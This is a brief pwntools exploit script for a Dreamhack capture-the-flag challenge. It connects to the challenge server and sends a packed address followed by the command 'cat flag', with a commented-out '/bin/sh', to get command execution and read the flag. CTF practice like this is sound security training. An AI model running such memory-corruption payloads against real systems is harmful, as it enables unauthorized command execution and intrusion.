from pwn import *

r=remote("host1.dreamhack.games",24437)
print("remote success")
payload=p32(0x804a0b0)
payload+= "cat flag"
#payload+="/bin/sh"

print(r.recvuntil("name: "))
r.send(payload)

print(r.recv(100))
r.sendline("19")
print(r.recv(100))
